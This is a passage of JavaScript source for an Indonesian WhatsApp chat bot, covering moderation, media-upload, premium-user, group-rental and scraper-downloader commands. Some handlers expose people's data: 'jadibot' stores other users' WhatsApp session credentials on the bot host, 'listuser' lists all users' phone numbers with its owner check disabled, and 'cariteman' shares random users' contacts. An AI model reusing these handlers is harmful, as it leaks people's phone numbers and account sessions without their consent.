            mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
            if (mentioned.length < 1) {
            asu = dev.message.extendedTextMessage.contextInfo.participant           
            if(!cekBannedUser (asu, ban)) return setReply("Udah di unban")
            unBanned (asu, ban)             
            setReply( `*Klo udah di unban jangan jadi beban lagi yah*  🙂 @${asu.split("@")[0]}`);
            } else {
       	 if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
            if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa banned Owner`)
            if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa banned owner group`)    
            lala = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
            if(!cekBannedUser (lala, ban)) return setReply("Udah di unban")        
            unBanned(lala, ban) 
            setReply(`*Klo udah di unban jangan jadi beban lagi yah*  🙂 @${mentioned[0].split('@')[0]}`);
            }
            break    
         



           
           
           
           
     
	case 'setfakeimg':
    if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
        	if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
			delb = await xdev.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/fake.jpeg`, delb)
			setReply(`Berhasil mengubah fake image`)
        	} else {
            setReply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
			
			
			
		case 'setthumb':
        if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          setReply(`Berhasil mengubah thumbnail`)
        } else {
          setReply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
			
           
case 'setovo':
        if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./kode qr/ovo.jpg`, delb);
          setReply(`Berhasil mengubah kode qr ovo`)
        } else if(q){
          setReply(`Kirim gambar dengan caption ${prefix}setovo`);
        }
        break;
        
        
        case 'setgopay':
        if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./kode qr/gopay.jpg`, delb);
          setReply(`Berhasil mengubah kode qr gopay`)
       } else if(q){
          setReply(`Kirim gambar dengan caption ${prefix}setgopay`);
        }
        break;
           
           
       case 'setdana':
        if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./kode qr/dana.jpg`, delb);
          setReply(`Berhasil mengubah kode qr dana`)
        } else if(q){
          setReply(`Kirim gambar dengan caption ${prefix}setdana`);
        }
        break;
        
        
        case 'setimagereply':
        case 'setimgreply':
        if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/reply.jpg`, delb);
          setReply(`Berhasil mengubah image reply`)
        } else {
          setReply(`Kirim gambar dengan caption ${prefix}setimagereply`);
        }
        break;
        
        
        case 'setimageinfo':
        if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/bot.jpg`, delb);
          setReply(`Berhasil mengubah image pada infobotz`)
        } else {
          setReply(`Kirim gambar dengan caption ${prefix}setimageinfo`);
        }
        break;
           
           
     case 'addstik':
		if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedSticker) return setReply('Reply stiker nya')
				
				if (!q) return setReply('Nama sticker nya apa?')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				setiker.push(`${q}`)
				fs.writeFileSync(`./temp/stick/${q}.webp`, delb)
				fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
				xdev.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: dev})
				break
					case 'dellstik':
					case 'delstik':
					if(!dev.key.fromMe & !isOwner) return setReply('Only owner')
					if (!q) return setReply(mess.wrongFormat)
					try {
						wanu = imagenye.indexOf(q)
						setiker.splice(wanu,1)
						fs.unlinkSync(`./temp/stick/${q}.webp`)
						fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
						setReply(`Succes delete sticker ${q}!`)
					} catch (err) {
						setReply(`Gagal delete sticker ${q}!`)
					}
					break
			
				
				case 'addimg':
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedImage) return setReply('Reply imagenya')
				
				if (!q) return setReply('Nama imagenya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				imagenye.push(`${q}`)
				fs.writeFileSync(`./temp/foto/${q}.jpeg`, delb)
				fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
				xdev.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, { quoted: dev})
				break
				
				
				case 'delimg':
				if (!isOwner) return onlyOwner() 
					try { 
					 wanu = imagenye.indexOf(q)
					 imagenye.splice(wanu, 1)
					fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
					 fs.unlinkSync(`./temp/foto/${q}.jpeg`)
					 setReply( 'Sukses')
					} catch (err){
						console.log(err)
						setReply('error kak')
					}
					break
				
				case 'addvid':
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedVideo) return setReply('Reply vidionya')
				
				if (!q) return setReply('Nama vidionya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				videonye.push(`${q}`)
				fs.writeFileSync(`./temp/video/${q}.mp4`, delb)
				fs.writeFileSync('./temp/video.json', JSON.stringify(videonye))
				xdev.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: dev })
				break
				
				
				case 'delvid':
				case 'dellvid':
				if (!isOwner) return onlyOwner() 
					try {
					 
					 wanu = videonye.indexOf(q)
					 videonye.splice(wanu, 1)
					fs.writeFileSync('./temp/video.json', JSON.stringify(videonye))
					 fs.unlinkSync(`./temp/video/${q}.mp4`)
					 setReply('Sukses')
					} catch (err){
						console.log(err)
						setReply('error kak')
					}
					break
				
				
				
				
				case 'addvn':
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedAudio) return setReply('Reply vnnya')
				if (!q) return setReply('Nama audionya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				audionye.push(q)
				fs.writeFileSync(`./temp/audio/${q}.mp3`, delb)
				fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
				xdev.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: dev})
				break
				
				
				
				case 'adderror':
				case 'emror':
				{
				if (!q) return setReply(`Yang error apa bro ?\nContoh: ${prefix}adderror nosinya|menu`)
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				oke = q.split("|")[0]
				oka = q.split("|")[1]
				addError(oke, oka, listerror)
				await setReply(`Sukses Menambahkan ${q} ke daftar error`)
				}
				break
				
				
			      
           
      case 'addbadword':
                if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
                if (args.length < 1) return setReply(`masukkan kata`)
                if (isKasar(q, badword)) return setReply(`Udah ada`)
                addBadword(q, badword)
                setReply(`Sukses`)
                break
            case 'delbadword':
                 if (!isGroupAdmins && !isOwner) return setReply('hanya admin dan owner') 
                if (args.length < 1) return setReply(`masukkan kata`)
                if (!isKasar(q, badword)) return setReply(`Ga ada`)
                delBadword(q, badword)
                setReply(`Sukses`)
                break
            case 'clearbadword':
                if (!isOwner) return onlyOwner() 
                if (args.length < 1) return setReply(`tag atau nomor`)
                if (mentioned.length !== 0){
                    for (let i = 0; i < mentioned.length; i++){
                    delCountKasar(mentioned[i], senbadword)
                    }
                    setReply('Sukses')
                } else {
                    delCountKasar(args[1] + '@s.whatsapp.net', senbadword)
                    setReply('Sukses')
                }
                break




    

    

case 'antichatbot':
                if (!isOwner) return onlyOwner()
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                  if(chatBot === true) return setReply("Udah aktif")
                    chatBot = true
					setReply(`Sukses mengaktifkan Antichatbot\nuntuk mengganti teks chatbot ketik ${prefix}tekschat <teks>`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                   if(chatBot === false) return setReply("Sudah mati")
                    chatBot = false
					setReply(`Berhasil mematikan Antichatbot`)
                } else if (!q) {
                      sendButMessage(from, `MODE ANTI CHAT BOT`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antichatbot on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antichatbot off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                





case 'explain':
                if (!isOwner) return onlyOwner()
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                  if(explain) return setReply("Udah aktif")
                    explain = true
					setReply(`Sukses mengaktifkan explain silakan cek dengan ketik ${prefix}menu`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                   if(!explain) return setReply("Sudah mati")
                    explain = false
					setReply(`Berhasil mematikan explain`)
                } else if (!q) {
                      sendButMessage(from, `MODE EXPLANATION`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}explain on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}explain off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;





case 'anticall':
                if (!isOwner) return onlyOwner()
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                  if(Anticall === true) return setReply("Udah aktif")
                    Anticall = true
					setReply(`Sukses mengaktifkan Anticall`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                   if(Anticall === false) return setReply("Sudah mati")
                    Anticall = false
					setReply(`Berhasil mematikan Anticall`)
                } else if (!q) {
                      sendButMessage(from, `MODE ANTI CALL`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}anticall on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}anticall off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
   


              
                 
    
case 'jadibot':
case 'jadilonte':
if (!isOwner) return  setReply("Harus ijin owner")
setReply(mess.wait)
client.version = [2, 2143, 3]
client.browserDescription = ['EXTREAM','Ubuntu','3.0']
if (args[0] && args[0].length > 200) {
	let json = Buffer.from(args[0], 'base64').toString('utf-8')
    let obj = JSON.parse(json)
    await client.loadAuthInfo(obj)
}
try {
client.on('qr' ,async qr => {
qrbot = await qrkode.toDataURL(qr, { scale: 8 })
buffqr = await new Buffer.from(qrbot.replace('data:image/png;base64,', ''), 'base64')
await fs.writeFileSync(`./jadibot@${sender}.jpg`, buffqr)
let scen = await xdev.sendMessage(from, fs.readFileSync(`./jadibot@${sender}.jpg`), MessageType.image, {quoted : dev,caption: 'Scan QR ini untuk jadi bot sementara!\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk WhatsApp Web\n3. Scan QR ini \n\nQR Expired dalam 20 detik'})    
setTimeout(() => {
xdev.deleteMessage(from, scen.key)
}, 30000);
})  
client.on ('open', async () => {
console.log ('credentials update')
const authInfo = client.base64EncodedAuthInfo()
fs.writeFileSync(`./${sender}.json`, JSON.stringify(authInfo  ,null, '\t'))
await client.sendMessage('0@s.whatsapp.net', `Kamu bisa login tanpa qr dengan pesan dibawah ini`, MessageType.extendedText)
client.sendMessage('0@s.whatsapp.net', `${prefix}${command} ${Buffer.from(JSON.stringify(authInfo)).toString('base64')}`, MessageType.extendedText)

client.on("group-update", async (anu) => {
require('./message/group-settings.js')(client, anu)
});
client.on('group-participants-update', async (anu) => {
require('./message/group.js')(client, anu)
});
client.on("CB:action,,battery", json => {
const baterai2 = {
battery: "" || "Belom Terdeteksi",
isCharge: "Sedang di cas" || "Tidak di cas"
}
const battery = json[2][0][1].value
const persenbat2 = parseInt(battery)
baterai2.battery = `${persenbat2}%`
baterai2.isCharge = json[2][0][1].live
})})
client.on('chat-update', async (chat) => {
require('./index.js')(client, chat, baterai2)
})    
await client.connect().then(async ({user}) => {
listjadibot1.push(client.user)
setReply('Berhasil tersambung dengan WhatsApp - mu.\n*NOTE: Ini cuma numpang*\n' + JSON.stringify(user, null, 2))
})
} catch {
setReply('Error! hanya 1 orang yang dapat mengakses fitur jadibot')
}
break
           
           
           case 'stopjadibot':
if (!isOwner && !dev.key.fromMe) return setReply("tidak bisa stopjadibot kecuali owner")
try {
fs.unlinkSync(`./${sender}.json`)
fs.unlinkSync(`./jadibot@${sender}.jpg`)
client.close()
} catch {
setReply('Done')
client.close()
}
break
	
	
	
	case 'addsewa':
	           {
		      if (!isOwner) return onlyOwner()
              if (!isGroup)return setReply(mess.only.group)
              if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
              if (args.length < 1) return setReply(`Penggunaan :\n*${prefix}addsewa waktu`)       
             if(_sewa.checkSewaGroup(from, sewa)) return setReply("Grup tersebut masih tersisa waktu sewa")
             linkgc = await xdev.groupInviteCode(from)
             yeh = `https://chat.whatsapp.com/${linkgc}`          
            _sewa.addSewaGroup(from, groupName, yeh, q, sewa)
             await setReply(`Success`)
              }
              break
              
              case 'delsewa':
              {
              if (!isOwner) return onlyOwner()
              if (!isGroup)return setReply(mess.only.group)
              sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
              fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa))
              setReply(mess.success)
              }
              break
              
              
              
              
              
       case 'sewalist': 
       case 'listsewa':
              let txtnyee = `*List Sewa*\nJumlah : ${sewa.length}\n\n`
              for (let i of sewa){
              let cekvipp = ms(i.expired - Date.now())
              txtnyee += `Group : ${i.group}\nID : ${i.id}\nExpire : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\n\n`             
               } 
               txtnyee += `© ${fake1}`
              setReply(txtnyee)
              break
              
              
       case 'orderlist': 
       case 'listorder':
              if (!isOwner) return onlyOwner()
              let ordernye = `*List Order*\nJumlah : ${sewa.length}\n\n`
              for (let i of sewa){
              let cekvipp = ms(i.expired - Date.now())
              ordernye += `Group : ${i.group}\nID : ${i.id}\nExpired : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\nLink : ${i.linkgc}\n\n`             
               } 
               ordernye += `© ${fake1}`
              setReply(ordernye)
              break
              
            case 'listuser':
			case 'userlist':
		//     if (!isOwner) return onlyOwner()
	         let usernye = `*List User*\nJumlah : ${user.length}\n\n`
			user.map(function(e, i){
			
            usernye += (i+1)+`.🆔 Nama : ${e.name}\n    📲 Nomer : wa.me/${e.id}\n    📟 User Hit : ${e.hit}\n    🔰 Pangkat : ${userLeveling(e.level)}\n\n`            
        });
				setReply(usernye)
				break
              
             
             
              
      case 'listerror': 
      case 'errorlist':
      case 'daftarerror':
              let errornye = `*List Error*\nJumlah : ${JSON.parse(fs.readFileSync('./database/listerror.json')).length}\n\n`
              for (let i of JSON.parse(fs.readFileSync('./database/listerror.json'))){          
              errornye += `Command : ${i.cmd}\n${i.error}\n\n`             
               } 
               errornye += `© ${fake1}`
              setReply(errornye)
              break


	
	case 'premium':
	case 'prem':
	case 'addprem':
	       if (!isOwner) return onlyOwner()
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}addprem Tag/Reply/input nomer\n\nPilih waktu\ns = detik\nh = jam\nd =hari\n\nContoh: ${prefix}addprem +62xxx 1h`)       
if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62')  
if(args.length > 2 ) return setReply(`Format salah, ketik ${prefix}addprem 62851xxx 1h Gitu tod`)
if(args.length < 2 ) return setReply(`Format salah, ketik ${prefix}addprem 62851xxx 1h Gitu tod`)
nomor = args[0] + `@s.whatsapp.net`              
if(_prem.checkPremiumUser (nomor, premium)) return setReply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (nomor, args[1], premium)         
await setReply(`Succes add premium ${nomor}`)
await sendButMessage(nomor, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
    
} else if (dev.message.extendedTextMessage.contextInfo.participant) {
premnih = dev.message.extendedTextMessage.contextInfo.participant
if (!isGroup) return setReply("Hanya bisa di group")
if(args.length < 1) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)      
 if(_prem.checkPremiumUser (premnih, premium)) return setReply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (premnih, q, premium)         
 await setReply(`Succes add premium ${premnih.split("@")[0]}`)
await sendButMessage(premnih, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
    
 } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
if(args.length < 2) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)       
lulu =`${mentioned[0].split('@')[0]}@s.whatsapp.net`
 if(_prem.checkPremiumUser (lulu, premium)) return setReply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (lulu, args[1], premium)         
await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
await sendButMessage(lulu, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
   } else{
 setReply(`Kirim perintah ${prefix}addprem @tag atau nomor atau reply pesan orang yang ingin di addprem`)
 }
break    
	
	
	
  
         
case 'delprem':
case 'delpremium':
       if (!isOwner) return onlyOwner()
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply("Penggunaan : delprem Tag/Reply/Input nomer target yang mau di jadikan premium")
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
if(args[3]) return setReply(`Format salah, ketik ${prefix}delprem 62851xxx  Gitu tod`)
nomor = args[0] + `@s.whatsapp.net` 
if(!_prem.checkPremiumUser (nomor, premium)) return setReply("Maap kak user tersebut tidak ada di database")   
          _prem.delPremiumUser (nomor, premium)
          return setReply(`Succes delete premium ${nomor}`)
          
 } else if (dev.message.extendedTextMessage.contextInfo.participant) {
if (!isGroup) return setReply("Hanya bisa di group")
premnih = dev.message.extendedTextMessage.contextInfo.participant
if(args.length > 0) return setReply("Format salah")
if(!_prem.checkPremiumUser (premnih, premium)) return setReply("Maap kak user tersebut tidak ada di database")   
 _prem.delPremiumUser (premnih, premium) 
  await setReply(`Succes delete premium  ${premnih.split("@")[0]}`)
  
} else if(dev.message.extendedTextMessage.contextInfo.mentionedJid) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if(mentioned.length > 1) return setReply("Satu satu kak")
	lulu = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
	if(!_prem.checkPremiumUser (lulu, premium)) return setReply("Maap kak user tersebut tidak ada di database")   
_prem.delPremiumUser (lulu, premium) 
await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
 }
break    
	
          
          
                 


 
                  
                  
         
	
	
	
	
	
	case 'addstatus':
	case 'addstory':
					if (!isOwner && !dev.key.fromMe) return onlyOwner()
					if (args.length < 1) return setReply('Teksnya?')
					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
							await xdev.sendMessage('status@broadcast', buff, image, {caption: `${q}`})
						await setReply(`Sukses mengirim up status image ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
							await xdev.sendMessage('status@broadcast', buff, video, {caption: `${q}`})
						setReply(`Sukses mengirim up status video ${q}`)
						} else {
							await xdev.sendMessage('status@broadcast', `*${q}`,text)
						await sendMess(`Sukses mengirim status:\n${q}`)
					}
					break
					
	
	
//-------------------------------》FITUR PREMIUM《-------------------------------\\       
	
	
case 'cariteman':
case 'caridoi':
if (!isPremium && !isOwner && !dev.key.fromMe) return setReply(`Kamu bukan user premium`)
	//const namanya = xdev.contacts[teman] != undefined ? xdev.contacts[teman].vname || xdev.contacts[teman].notify : undefined
	          
 teman = user[Math.floor(Math.random() * user.length)]
 namaTeman = teman.name
 nomerTeman = teman.id
	setTimeout( () => {
                    setReply("Sedang mencari....")
                    },1000)  
	setTimeout( () => {
                    setReply("Berhasil mendapatkan satu doi")
                    },5000)  
    setTimeout( () => {           
    sendKontak(from, `${nomerTeman}`, namaTeman, "Sibuk");
                    },9000)  
    break
	
	
	
	
	
	
	case 'chat':
	if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
           if (args.length < 1) return setReply(`Penggunaan ${prefix}chat 62xnxx|teks`)
			if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62') 
            var nomor = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") 
            var org = q.split("|")[1];
            xdev.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            setReply(`Sukses mengirim chat:\n${org} ke nomer ${nomor}`)
            break
	
	
//-----------------------------------] Menu Download [-----------------------------------//
	
/*
    otakudesu,
	covid,
	ongoing,
	komiku,✓
	tebakgambar,
	surah,
	sholat,
	lirik,
	chara,✓
	wattpad,
	playstore,✓
	linkwa,✓
	pinterest,✓
	igdl,✓
	igstory,✓
	igstalk,✓
	twitter,✓
	fbdown,✓
	youtube,
	ttdownloader✓
         -ttaudio
         -ttwm✓
         -ttnowm✓
*/


case 'komiku':

            if(!q) return setReply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
fotonya = komik.image  
            sendFileFromUrl(fotonya, image, {quoted: dev, caption: result})
            break


case 'twmp4': case 'twitter':
if (args.length < 1) return setReply('Link?')
lin = args[0]
setReply(mess.wait)
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
sendMediaURL(from, Anu, 'Done!')
})
break


case 'twmp4hd':
case 'twitterhd':
  if (!isPremium && !isOwner && !dev.key.fromMe) return setReply(`Kamu bukan user premium`)
if (args.length < 1) return setReply('Link?')
lin = args[0]
setReply(mess.wait)
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.HD
fotonya = res.thumb
//fto =  await getBuffer(fotonya)
//xdev.sendMessage(from, fto, image, {quoted:dev, caption:`*TWITTER MP4*\n\n•> Hd : ${res.HD}\n•> Sd : ${res.SD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: fto, contextInfo:forward})
sendMediaURL(from, Anu, 'Done!')
})
break





            
 
            
            
            

case 'lirik':
try{
            if(!q) return setReply('lagu apa?')
            let song = await hx.lirik(q)
            console.log(song)
            musik = song.lirik
            if(`${musik}` === "undefined" ) return setReply("Gak ketemu om")
            foto = await getBuffer(song.thumb)
            liriknya = song.lirik
            let oket = [{
										"buttonId": `${prefix}play ${q}`,
										"buttonText": {
											"displayText": `🌐 ʏᴏᴜᴛᴜʙᴇ`
											},
										"type": "RESPONSE"
										}]
										sendButLocation(from, liriknya, `\n© ${fake1}`, foto, oket, {contextInfo: forward})
										
            } catch (err){
            	console.log(err)
            	setReply("Wuanjir error, coba lirik lain")
   
            }
            break





case "halo":
aw = `${getHit("run", hitnya)}`
setReply(aw)
break



           



case 'pinterest':
try{
        if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if(!q) return setReply('gambar apa?')
            setReply(mess.wait)
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            
            let di = await getBuffer(ac)
            await xdev.sendMessage(from,di,image,{quoted: dev})
               } catch (err){
					      console.log(err)
					       return setReply("Yah ga ketemu, coba lagi dong ^_^ ")
					       }
            break
	
	

	
	
	
	
	case 'igstory': 
            if(!q) return setReply('Usernamenya?')
            pape = q
            hx.igstory(pape)
           .then(async result => {
            for(let i of result.medias){
            if(i.url.includes('mp4')){
            let link = await getBuffer(i.url)
            xdev.sendMessage(from,link,video,{quoted: dev,caption: `${i.type}`})
            } else {
            let link = await getBuffer(i.url)
            xdev.sendMessage(from, link, image,{quoted: dev,caption: `${i.type}`})                  
            }
            }
            });
            break
           
	
	case 'linkwa':
            if(!q) return setReply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            setReply(res)
            });
            break
    
	
	case 'otaku':
	try{
		setReply("Wait kak, kalo ga respon berarti error")
            if(!q) return setReply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
           await xdev.sendMessage(from,ram,image,{quoted:dev,caption:rem})
            } catch (err){
            	console.log(err)
            	return setReply("Ga ketemu om")
            }       
            break
         
case 'komikindo':
            axios.get('https://komikindo.co/?s=' + q)
	.then(({ data }) => {
            console.log(`${data}`)
            setReply(`${data}`)
            })
            break
	
	
	
	
	
	
	
	
	case 'chara':
	case 'wallpaperflare':
	try{
            if(!q) return setReply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await xdev.sendMessage(from,li,image,{quoted: dev})
                  } catch (err){
					      console.log(err)
					        setReply("Yah ga ketemu, coba lagi dong ^_^ ")
					       }
            break
	
	
	
	case 'playstore':
            if(!q) return setReply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            setReply(store)
            break
            
            
            
            
            
            
            
            
            
            
            
